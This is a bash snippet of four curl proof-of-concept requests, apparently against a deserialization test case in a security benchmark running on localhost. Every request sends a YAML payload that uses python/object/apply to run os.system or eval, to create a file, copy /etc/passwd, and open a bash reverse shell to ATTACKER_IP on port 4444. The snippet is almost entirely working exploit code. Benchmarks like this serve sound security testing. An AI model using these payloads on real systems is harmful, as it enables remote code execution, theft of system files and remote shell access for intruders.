```bash
# PoC 1: Execute arbitrary command (touch file)
curl -X POST 'http://localhost:8443/benchmark/deserialization-00/BenchmarkTest00433' \
  -d '!!python/object/apply:os.system {args: [touch /tmp/pwned]}=BenchmarkTest00433'

# PoC 2: Read sensitive files (output written to file)
curl -X POST 'http://localhost:8443/benchmark/deserialization-00/BenchmarkTest00433' \
  -d '!!python/object/apply:os.system {args: [cat /etc/passwd > /tmp/out]}=BenchmarkTest00433'

# PoC 3: Direct output in response via eval
curl -X POST 'http://localhost:8443/benchmark/deserialization-00/BenchmarkTest00433' \
  -d "!!python/object/apply:builtins.eval {args: [\"{'text': 'INJECTION_SUCCESS'}\"]}=BenchmarkTest00433"

# PoC 4: Reverse shell (adjust IP/PORT)
curl -X POST 'http://localhost:8443/benchmark/deserialization-00/BenchmarkTest00433' \
  -d '!!python/object/apply:os.system {args: [bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"]}=BenchmarkTest00433'
```